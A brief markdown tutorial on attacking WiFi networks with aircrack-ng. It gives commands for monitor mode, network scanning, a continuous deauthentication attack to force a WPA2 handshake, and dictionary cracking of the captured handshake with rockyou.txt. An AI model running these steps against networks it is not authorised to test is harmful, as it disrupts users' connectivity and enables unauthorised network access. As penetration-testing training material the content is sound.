# WIFI Hacking Attacks

## Aircrack-ng Tool

Aircrack-ng is a set of utilities for **analyzing** WiFi networks for **weaknesses**.

### Installation

```bash
sudo apt-get update
sudo apt-get install -y aircrack-ng
```

### Usage

- Display **network interfaces**

```bash
iwconfig
```

- Give **access** to **Wifi interface** for Aircrack-ng.

```bash
sudo airmon-ng start interface-name
```

- Scanning and **capturing** wifi networks.

```bash
sudo airodump-ng interface-name-mon
```

`output example`

```bash
 BSSID    PWR  Beacons    #Data, #/s CH MB   ENC CIPHER AUTH   ESSID

mac@       0       0        0    0   0  0   WPA2 CCMP   PSK  NETWORK-NAME
```

**BSSID** : Mac Adress

**PWR** : Power value near/far

**CH** : Channel number

**ESSID** : Extended Service Set **Identification**

**ENC** : Encryption

- Waiting specific wifi network to **capture handshake**

```bash
sudo airodump-ng -w file -c channel --bssid mac@ interface-name-mon

# file : output file , mac@ : mac-address
```

- **Attacking** specific wifi network to **capture handshake**

```bash
sudo aireplay-ng --deauth 0 -a mac@ wlan0mon
```

### Scanning

- Analysing Handshake

looking for **wpa key** captured.

```bash
wireshark file.cap

# filter EAPOL
```


### Cracking

WPA3 encryption not supported by Aircrack-ng.

```bash
aircrack-ng file.cap -w rockyou.txt
```
